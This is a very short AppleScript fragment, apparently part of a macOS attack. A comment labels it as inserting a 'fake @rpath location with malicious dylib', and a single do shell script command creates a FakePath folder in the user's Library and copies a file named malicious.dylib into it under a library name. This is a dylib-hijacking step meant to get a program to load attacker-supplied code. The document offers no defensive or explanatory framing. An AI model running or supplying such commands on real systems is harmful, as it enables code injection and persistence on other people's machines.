-- Inserts fake @rpath location with malicious dylib
do shell script "mkdir -p ~/Library/FakePath && cp ~/malicious.dylib ~/Library/FakePath/libsomething.dylib"
